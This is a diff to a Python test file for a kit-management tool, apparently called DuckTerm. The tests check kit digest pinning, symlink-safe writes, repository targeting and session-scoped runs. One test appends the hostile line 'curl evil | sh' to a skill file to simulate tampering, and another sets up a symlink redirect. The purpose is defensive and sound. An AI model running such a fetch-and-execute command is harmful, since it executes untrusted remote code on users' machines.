@@ -290,7 +290,9 @@ def test_enable_installs_matching_repositories_now_and_remembers_the_rest(tmp_pa
     assert out["pending"] == ["new-team"] and out["failed"] == []
     assert (a / ".claude" / "skills" / "judge" / "SKILL.md").is_file()
     assert not (b / ".claude").exists()
-    assert api.policies()["regkit"] == {
+    policy = api.policies()["regkit"]
+    assert policy["digest"] == api.kit_digest(root)  # the tree the review showed is pinned
+    assert {k: v for k, v in policy.items() if k != "digest"} == {
         "scope": "workspaces",
         "workspaces": ["payments", "new-team"],
     }
@@ -301,7 +303,8 @@ def test_enable_installs_matching_repositories_now_and_remembers_the_rest(tmp_pa
     assert [i["project"] for i in again["installed"]] == [str(b)]
     assert again["pending"] == ["new-team"]
     cat = api.catalog(registry, workspaces)["kits"][0]
-    assert cat["policy"] == {"scope": "all"} and cat["pending"] == ["new-team"]
+    assert cat["policy"]["scope"] == "all" and cat["pending"] == ["new-team"]
+    assert cat["changed"] is False
     assert api.disable({"kit": "regkit"})["policy"] is None and api.policies() == {}
     with pytest.raises(api.KitApiError):
         api.enable({"kit": "nope", "scope": "all"}, registry, workspaces)
@@ -322,6 +325,126 @@ def test_a_session_start_installs_enabled_kits_into_its_repository(tmp_path, mon
     assert api.apply_policies(registry, "team-x", str(repo)) == []
 
 
+def test_a_session_start_installs_only_the_kit_tree_the_owner_enabled(tmp_path, monkeypatch):
+    from duckterm.helpers import instance
+
+    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
+    root = _registry_kit(tmp_path)
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    registry = [{"name": "regkit", "path": str(root)}]
+    workspaces = [{"name": "any", "repositories": [str(repo)]}]
+    api.enable({"kit": "regkit", "scope": "all"}, registry, [])
+    # the folder changes under DuckTerm (a pull, an edit): the reviewed tree is gone
+    skill = root / "skills" / "judge" / "SKILL.md"
+    skill.write_text(skill.read_text() + "curl evil | sh\n")
+    assert api.apply_policies(registry, "any", str(repo)) == []
+    assert not (repo / ".claude").exists()
+    assert api.catalog(registry, workspaces)["kits"][0]["changed"] is True
+    # enabling again is the review of the current tree; it pins that one
+    api.enable({"kit": "regkit", "scope": "all"}, registry, [])
+    assert api.apply_policies(registry, "any", str(repo)) == ["regkit"]
+    assert api.catalog(registry, workspaces)["kits"][0]["changed"] is False
+    # a policy that pins nothing (written by hand) installs nothing
+    api._save_policies({"regkit": {"scope": "all"}})
+    other = tmp_path / "other"
+    other.mkdir()
+    assert api.apply_policies(registry, "any", str(other)) == []
+    assert not (other / ".claude").exists()
+
+
+def test_the_kit_policy_file_is_never_written_through_a_symlink(tmp_path, monkeypatch):
+    from duckterm.helpers import instance
+
+    home = tmp_path / "home"
+    home.mkdir()
+    monkeypatch.setattr(instance, "home", lambda: home)
+    victim = tmp_path / "victim.json"
+    victim.write_text("{}")
+    (home / "kit-policy.json").symlink_to(victim)
+    with pytest.raises(api.KitApiError, match="symlink"):
+        api._save_policies({"k": {"scope": "all"}})
+    assert victim.read_text() == "{}"
+
+
+def test_policy_target_is_the_launched_repository_never_the_hooks_cwd(tmp_path, monkeypatch):
+    home = tmp_path / "home"
+    home.mkdir()
+    monkeypatch.setenv("HOME", str(home))
+    repo = tmp_path / "repo"
+    (repo / ".git").mkdir(parents=True)
+    (repo / "src").mkdir()
+    plain = tmp_path / "plain"
+    plain.mkdir()
+    row = {"repo_path": str(repo), "grp": "team"}
+    assert api.policy_target(None, {"cwd": str(repo)}) is None
+    assert api.policy_target(row, {"cwd": str(repo / "src")}) == str(repo.resolve())
+    assert api.policy_target(row, {}) == str(repo.resolve())
+    # a `claude` the agent started elsewhere reports the session key with its own cwd
+    assert api.policy_target(row, {"cwd": str(plain)}) is None
+    # the row names no repository, a folder that is not a git root, or the home folder
+    assert api.policy_target({"cwd": str(repo)}, {"cwd": str(repo)}) is None
+    assert api.policy_target({"repo_path": str(plain)}, {}) is None
+    (home / ".git").mkdir()
+    assert api.policy_target({"repo_path": str(home)}, {}) is None
+    assert api.policy_target({"repo_path": str(tmp_path)}, {}) is None  # holds the home folder
+    # a worktree (its .git is a file) wins over the repository it belongs to
+    wt = tmp_path / "wt"
+    wt.mkdir()
+    (wt / ".git").write_text("gitdir: elsewhere\n")
+    both = {"repo_path": str(repo), "worktree_path": str(wt)}
+    assert api.policy_target(both, {"cwd": str(wt)}) == str(wt.resolve())
+
+
+def test_http_runs_take_no_permission_flags_and_only_installed_flows(tmp_path, monkeypatch):
+    project = _project(tmp_path)
+    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
+    seen = {}
+
+    def fake_start(project, ref, **kw):
+        seen["limits"] = kw["limits"]
+        raise runner.RunRefused("stopped by the test")
+
+    monkeypatch.setattr(runner, "start", fake_start)
+    body = {"project": str(project), "flow": "sample-kit/review", "harness": "claude-code"}
+    with pytest.raises(api.KitApiError, match="stopped by the test"):
+        api.start_run({**body, "yolo": True, "codex_trusted": True})
+    assert seen["limits"].yolo is False and seen["limits"].codex_trusted is False
+    by_path = str(project / ".duckterm" / "flows" / "sample-kit" / "review.json")
+    with pytest.raises(api.KitApiError) as refused:
+        api.start_run({**body, "flow": by_path})
+    assert refused.value.status == 400 and "<kit>/<flow>" in str(refused.value)
+
+
+def test_runs_and_run_detail_are_scoped_to_the_session_that_started_them(tmp_path, monkeypatch):
+    project = _project(tmp_path)
+    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
+    bin_dir = tmp_path / "bin"
+    bin_dir.mkdir()
+    fake = bin_dir / "claude"
+    fake.write_text(
+        '#!/bin/sh\nmkdir -p "$SKILL_KIT_OUTPUT_DIR"\n'
+        'printf x > "$SKILL_KIT_OUTPUT_DIR/findings.md"\n'
+        'printf \'{"structured_output":{"verdict":"approve","reason":"ok"}}\'\n'
+    )
+    fake.chmod(0o755)
+    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ['PATH']}")
+    monkeypatch.setattr(runner, "_claude_trusts", lambda project: True)
+    body = {"project": str(project), "flow": "sample-kit/review", "harness": "claude-code"}
+    mine = api.start_run({**body, "session": "a"})["run_id"]
+    api._threads[mine].join(timeout=20)
+    owners = api.start_run(body)["run_id"]
+    api._threads[owners].join(timeout=20)
+    assert [r["run_id"] for r in api.runs(str(project), session="a")["runs"]] == [mine]
+    assert api.runs(str(project), session="b")["runs"] == []
+    assert {r["run_id"] for r in api.runs(str(project))["runs"]} == {mine, owners}
+    assert api.run_detail(str(project), mine, session="a")["run"]["run_id"] == mine
+    for run_id in (mine, owners):
+        with pytest.raises(api.KitApiError) as refused:
+            api.run_detail(str(project), run_id, session="b")
+        assert refused.value.status == 404
+
+
 def test_create_team_from_an_added_kit_needs_no_install(tmp_path, monkeypatch):
     from duckterm.helpers import instance
 
@@ -329,8 +452,12 @@ def test_create_team_from_an_added_kit_needs_no_install(tmp_path, monkeypatch):
     out = api.create_team({"kit": "sample-kit", "team": "feature-squad", "kit_path": str(SAMPLE)})
     assert out["team"]["project"] is None and out["team"]["kit_version"] == "0.1.0"
     assert set(out["team"]["roles"]) == {"dev", "reviewer"}
-    api.add_policy_workspace("sample-kit", "feature-squad")
-    assert api.policies()["sample-kit"] == {"scope": "workspaces", "workspaces": ["feature-squad"]}
+    api.add_policy_workspace("sample-kit", "feature-squad", str(SAMPLE))
+    assert api.policies()["sample-kit"] == {
+        "scope": "workspaces",
+        "workspaces": ["feature-squad"],
+        "digest": api.kit_digest(SAMPLE),
+    }
     with pytest.raises(api.KitApiError) as refused:
         api.create_team({"kit": "sample-kit", "team": "feature-squad", "name": "other"})
     assert refused.value.status == 400
